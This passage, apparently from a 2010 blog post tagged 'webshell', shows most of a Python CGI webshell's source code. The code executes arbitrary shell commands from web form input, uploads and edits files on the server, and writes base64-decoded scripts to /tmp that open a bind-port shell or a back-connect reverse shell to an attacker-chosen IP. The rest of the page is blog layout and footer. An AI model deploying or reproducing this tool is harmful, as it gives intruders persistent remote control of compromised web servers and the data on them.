<span class="k">def</span> <span class="nf">get_param</span><span class="p">(</span><span class="n">form</span><span class="p">,</span> <span class="n">param</span><span class="p">,</span><span class="n">default</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">form</span><span class="o">.</span><span class="n">has_key</span><span class="p">(</span><span class="n">param</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">form</span><span class="o">.</span><span class="n">getvalue</span><span class="p">(</span><span class="n">param</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">default</span>

<span class="k">def</span> <span class="nf">can_write</span><span class="p">(</span><span class="n">file_name</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">)</span>
        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">return</span> <span class="bp">True</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>

<span class="k">def</span> <span class="nf">put_script</span><span class="p">(</span><span class="n">base_name</span><span class="p">,</span><span class="n">encoded_script</span><span class="p">):</span>
    <span class="n">script</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">encoded_script</span><span class="p">)</span>
    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">file_name</span> <span class="o">=</span> <span class="s2">&quot;/tmp/&quot;</span><span class="o">+</span><span class="n">base_name</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
    <span class="k">while</span> <span class="ow">not</span> <span class="n">can_write</span><span class="p">(</span><span class="n">file_name</span><span class="p">):</span>
        <span class="n">i</span><span class="o">+=</span><span class="mi">1</span>
        <span class="n">file_name</span> <span class="o">=</span> <span class="s2">&quot;/tmp/&quot;</span><span class="o">+</span><span class="n">base_name</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">)</span>
    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">script</span><span class="p">)</span>
    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">file_name</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>

    <span class="k">print</span> <span class="s2">&quot;Content-type: text/html&quot;</span>         <span class="c1"># header</span>
    <span class="k">print</span>                                   <span class="c1"># blank line</span>

    <span class="n">form</span> <span class="o">=</span> <span class="n">cgi</span><span class="o">.</span><span class="n">FieldStorage</span><span class="p">()</span>
    <span class="n">uname</span> <span class="o">=</span> <span class="n">run_command</span><span class="p">(</span><span class="s2">&quot;uname -a&quot;</span><span class="p">)</span>
    <span class="n">uid</span> <span class="o">=</span> <span class="n">run_command</span><span class="p">(</span><span class="s2">&quot;id&quot;</span><span class="p">)</span>

    <span class="n">cur_dir</span> <span class="o">=</span> <span class="n">get_param</span><span class="p">(</span><span class="n">form</span><span class="p">,</span> <span class="s2">&quot;cur_dir&quot;</span><span class="p">,</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">())</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">cur_dir</span><span class="p">):</span>
        <span class="n">cur_dir</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">()</span>
    <span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">(</span><span class="n">cur_dir</span><span class="p">)</span>
    <span class="n">command</span> <span class="o">=</span> <span class="n">get_param</span><span class="p">(</span><span class="n">form</span><span class="p">,</span><span class="s2">&quot;command&quot;</span><span class="p">)</span>
    <span class="n">command_result</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>

    <span class="n">file_content</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
    <span class="n">file_name</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
    <span class="n">edit_file_box_visibility</span> <span class="o">=</span> <span class="s2">&quot;None&quot;</span>

    <span class="k">if</span> <span class="n">command</span> <span class="o">==</span> <span class="s2">&quot;mkdir&quot;</span><span class="p">:</span>
        <span class="n">new_dir</span> <span class="o">=</span> <span class="n">get_param</span><span class="p">(</span><span class="n">form</span><span class="p">,</span><span class="s2">&quot;new_dir&quot;</span><span class="p">)</span>
        <span class="n">command_result</span> <span class="o">=</span> <span class="n">run_command</span><span class="p">(</span><span class="s2">&quot;mkdir &quot;</span> <span class="o">+</span> <span class="n">new_dir</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">command</span> <span class="o">==</span> <span class="s2">&quot;upload&quot;</span><span class="p">:</span>
        <span class="n">upload_file</span> <span class="o">=</span> <span class="n">form</span><span class="p">[</span><span class="s2">&quot;file&quot;</span><span class="p">]</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">f</span>  <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">upload_file</span><span class="o">.</span><span class="n">filename</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">)</span>
            <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
                <span class="n">chunk</span> <span class="o">=</span> <span class="n">upload_file</span><span class="o">.</span><span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
                <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span> <span class="k">break</span>
                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
            <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span><span class="n">e</span><span class="p">:</span>
            <span class="n">command_result</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>

    <span class="k">elif</span> <span class="n">command</span> <span class="o">==</span> <span class="s2">&quot;search_text&quot;</span><span class="p">:</span>
        <span class="n">search_text</span> <span class="o">=</span> <span class="n">get_param</span><span class="p">(</span><span class="n">form</span><span class="p">,</span><span class="s2">&quot;search_text&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
        <span class="n">search_dir</span> <span class="o">=</span> <span class="n">get_param</span><span class="p">(</span><span class="n">form</span><span class="p">,</span><span class="s2">&quot;search_dir&quot;</span><span class="p">,</span><span class="s2">&quot;.&quot;</span><span class="p">)</span>
        <span class="n">include_pattern</span> <span class="o">=</span> <span class="n">get_param</span><span class="p">(</span><span class="n">form</span><span class="p">,</span><span class="s2">&quot;include_pattern&quot;</span><span class="p">)</span>
        <span class="n">exclude_pattern</span> <span class="o">=</span> <span class="n">get_param</span><span class="p">(</span><span class="n">form</span><span class="p">,</span><span class="s2">&quot;exclude_pattern&quot;</span><span class="p">)</span>
        <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&quot;grep -ir </span><span class="se">\&quot;</span><span class="si">%s</span><span class="se">\&quot;</span><span class="s2"> </span><span class="si">%s</span><span class="s2"> &quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">search_text</span><span class="p">,</span><span class="n">search_dir</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">include_pattern</span><span class="p">:</span>
            <span class="n">cmd</span> <span class="o">+=</span> <span class="s2">&quot;--include=</span><span class="si">%s</span><span class="s2"> &quot;</span> <span class="o">%</span> <span class="n">include_pattern</span>
        <span class="k">if</span> <span class="n">exclude_pattern</span><span class="p">:</span>
            <span class="n">cmd</span> <span class="o">+=</span> <span class="s2">&quot;--include=</span><span class="si">%s</span><span class="s2"> &quot;</span> <span class="o">%</span> <span class="n">exclude_pattern</span>
        <span class="n">command_result</span> <span class="o">=</span> <span class="n">run_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>

    <span class="k">elif</span> <span class="n">command</span> <span class="o">==</span> <span class="s2">&quot;edit_file&quot;</span><span class="p">:</span>
        <span class="n">file_name</span> <span class="o">=</span> <span class="n">get_param</span><span class="p">(</span><span class="n">form</span><span class="p">,</span><span class="s2">&quot;file_name&quot;</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span><span class="s2">&quot;r&quot;</span><span class="p">)</span>
            <span class="n">file_content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
            <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
            <span class="n">edit_file_box_visibility</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="n">command_result</span> <span class="o">=</span> <span class="s2">&quot;Cannot open file&quot;</span>
            <span class="n">file_content</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
            <span class="n">edit_file_box_visibility</span> <span class="o">=</span> <span class="s2">&quot;None&quot;</span>

    <span class="k">elif</span> <span class="n">command</span> <span class="o">==</span> <span class="s2">&quot;save_file&quot;</span><span class="p">:</span>
        <span class="n">file_name</span> <span class="o">=</span> <span class="n">get_param</span><span class="p">(</span><span class="n">form</span><span class="p">,</span><span class="s2">&quot;file_name&quot;</span><span class="p">)</span>
        <span class="n">file_content</span> <span class="o">=</span> <span class="n">get_param</span><span class="p">(</span><span class="n">form</span><span class="p">,</span><span class="s2">&quot;file_content&quot;</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">)</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">file_content</span><span class="p">)</span>
            <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
            <span class="n">command_result</span> <span class="o">=</span> <span class="s2">&quot;Successful&quot;</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="n">command_result</span> <span class="o">=</span> <span class="s2">&quot;Cannot write to file&quot;</span>

    <span class="k">elif</span> <span class="n">command</span> <span class="o">==</span> <span class="s2">&quot;bind_port&quot;</span><span class="p">:</span>
        <span class="n">port</span> <span class="o">=</span> <span class="n">get_param</span><span class="p">(</span><span class="n">form</span><span class="p">,</span><span class="s2">&quot;port&quot;</span><span class="p">)</span>
        <span class="n">password</span> <span class="o">=</span> <span class="n">get_param</span><span class="p">(</span><span class="n">form</span><span class="p">,</span><span class="s2">&quot;password&quot;</span><span class="p">)</span>
        <span class="n">file_name</span> <span class="o">=</span> <span class="n">put_script</span><span class="p">(</span><span class="s2">&quot;bp&quot;</span><span class="p">,</span><span class="n">bind_port</span><span class="p">)</span>
        <span class="n">pid</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">([</span><span class="s2">&quot;python </span><span class="si">%s</span><span class="s2"> </span><span class="si">%s</span><span class="s2"> </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">file_name</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">password</span><span class="p">)],</span><span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span><span class="o">.</span><span class="n">pid</span>
        <span class="n">command_result</span> <span class="o">=</span> <span class="s2">&quot;Process ID : </span><span class="si">%d</span><span class="s2"> &quot;</span> <span class="o">%</span> <span class="n">pid</span>

    <span class="k">elif</span> <span class="n">command</span> <span class="o">==</span> <span class="s2">&quot;back_connect&quot;</span><span class="p">:</span>
        <span class="n">port</span> <span class="o">=</span> <span class="n">get_param</span><span class="p">(</span><span class="n">form</span><span class="p">,</span><span class="s2">&quot;port&quot;</span><span class="p">)</span>
        <span class="n">ip</span> <span class="o">=</span> <span class="n">get_param</span><span class="p">(</span><span class="n">form</span><span class="p">,</span><span class="s2">&quot;ip&quot;</span><span class="p">)</span>
        <span class="n">file_name</span> <span class="o">=</span> <span class="n">put_script</span><span class="p">(</span><span class="s2">&quot;bc&quot;</span><span class="p">,</span><span class="n">back_connect</span><span class="p">)</span>
        <span class="n">pid</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">([</span><span class="s2">&quot;python </span><span class="si">%s</span><span class="s2"> </span><span class="si">%s</span><span class="s2"> </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">file_name</span><span class="p">,</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">)],</span><span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span><span class="o">.</span><span class="n">pid</span>
        <span class="n">command_result</span> <span class="o">=</span> <span class="s2">&quot;Process ID : </span><span class="si">%d</span><span class="s2"> &quot;</span> <span class="o">%</span> <span class="n">pid</span>

    <span class="k">elif</span> <span class="n">command</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">command_result</span> <span class="o">=</span> <span class="n">run_command</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>

    <span class="n">list_files</span> <span class="o">=</span> <span class="n">run_command</span><span class="p">(</span><span class="s2">&quot;ls -alh &quot;</span> <span class="o">+</span> <span class="n">cur_dir</span><span class="p">)</span>

    <span class="k">print</span> <span class="n">html</span><span class="o">.</span><span class="n">substitute</span><span class="p">(</span><span class="n">environ_table</span><span class="o">=</span><span class="n">get_environ_table</span><span class="p">(),</span>
                          <span class="n">uname</span> <span class="o">=</span> <span class="n">uname</span><span class="p">,</span>
                          <span class="n">uid</span> <span class="o">=</span> <span class="n">uid</span><span class="p">,</span>
                          <span class="n">list_files</span> <span class="o">=</span> <span class="n">list_files</span><span class="p">,</span>
                          <span class="n">cur_dir</span> <span class="o">=</span> <span class="n">cur_dir</span><span class="p">,</span>
                          <span class="n">command_result</span> <span class="o">=</span> <span class="n">command_result</span><span class="p">,</span>
                          <span class="n">file_content</span> <span class="o">=</span> <span class="n">file_content</span><span class="p">,</span>
                          <span class="n">file_name</span>    <span class="o">=</span> <span class="n">file_name</span><span class="p">,</span>
                          <span class="n">edit_file_box_visibility</span> <span class="o">=</span> <span class="n">edit_file_box_visibility</span>
                            <span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</pre></div>

  </div>



        </div>

          <div class="col-md-3">
  <div class="well">

    <p><abbr title="2010-05-19T06:41:00+07:00"><i class="fa fa-calendar"></i> Wed 19 May 2010</abbr></p>

      <p><address>
        <i class="fa fa-user"></i> By
          <a href="../../author/nhom-pcnv.html" rel="author">Nhóm PCNV</a>
      </address></p>

    <hr/>

      <p>
              <a href="../../category/bai-viet.html" rel="tag"
                  data-toggle="tooltip" class="label label-info"
                  title="45 articles in this category">Bài viết</a>
            <a href="../../tag/cgi.html" data-toggle="tooltip"
      class="label label-default"
      title="4 articles with this tag">cgi</a>
            <a href="../../tag/webshell.html" data-toggle="tooltip"
      class="label label-default"
      title="1 article with this tag">webshell</a>
      </p>
      <hr/>



  </div>
            
          </div>

      </div>

    </div>

    <!-- TODO: make footer sticky -->
    <footer class="container-fluid">
      <div class="container">
        <div class="row">

            <div class="col-md-2">
            </div>
            <div class="col-md-2">
                <h5>Links</h5>
                <ul class="list-unstyled">
                  <li>  <a href="https://www.python.org/">
      <i class="fa fa-link fa-fw"></i>
    Python.org
  </a></li>
                </ul>
            </div>

          <div class="col-md-2">
            <h5>Browse content by</h5>
            <ul class="list-unstyled">
                <li><a href="../../authors.html"><i class="fa fa-user fa-fw"></i> Authors</a></li>
                <li><a href="../../categories.html"><i class="fa fa-folder fa-fw"></i> Categories</a></li>
                <li><a href="../../archives.html"><i class="fa fa-calendar fa-fw"></i> Dates</a></li>
                <li><a href="../../tags.html"><i class="fa fa-tag fa-fw"></i> Tags</a></li>
            </ul>
          </div>

          <div class="col-md-2">
          </div>

        </div>
      </div>

      <h5 class="text-right"><a href="#"><i class="fa fa-arrow-up"></i> Back to top</a></h5>

      <div class="container">
        <div class="row col-md-12 text-muted text-center">
          <p>&copy; 2007-2018 Nhóm PCNV.</p>
          Site generated by <a href="https://getpelican.com"> Pelican</a>.<br/>
          <a href="https://github.com/kdeldycke/plumage"> Plumage</a> theme by <a href="https://kevin.deldycke.com">Kevin Deldycke</a>.
        </div>
      </div>

    </footer>


    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/fitvids/1.1.0/jquery.fitvids.min.js"></script>
    <script src="../../theme/js/jquery.mglass.js"></script>
    <script src="../../theme/js/application.js"></script>

  </body>
</html>